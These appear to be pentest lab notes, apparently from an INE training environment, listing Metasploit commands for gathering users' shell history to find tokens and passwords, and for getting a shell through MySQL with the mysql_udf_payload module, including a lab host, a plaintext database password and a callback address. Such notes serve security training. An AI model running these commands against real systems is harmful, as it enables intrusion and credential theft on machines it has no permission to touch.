#### Post Exploitation Metasploit Modules
> Enumerate users history . Sometime there may be tokens, password for various services in the history file.
```
background
use post/linux/gather/enum_users_history
set SESSION 1
run

```

#### Mysql to shell

```
exploit/multi/mysql/mysql_udf_payload
set FORCE_UDF_UPLOAD true
set PASSWORD fArFLP29UySm4bZj
set RHOSTS server2.ine.local
set TARGET 1
set LHOST 192.73.96.2
exploit
session -i 2
```

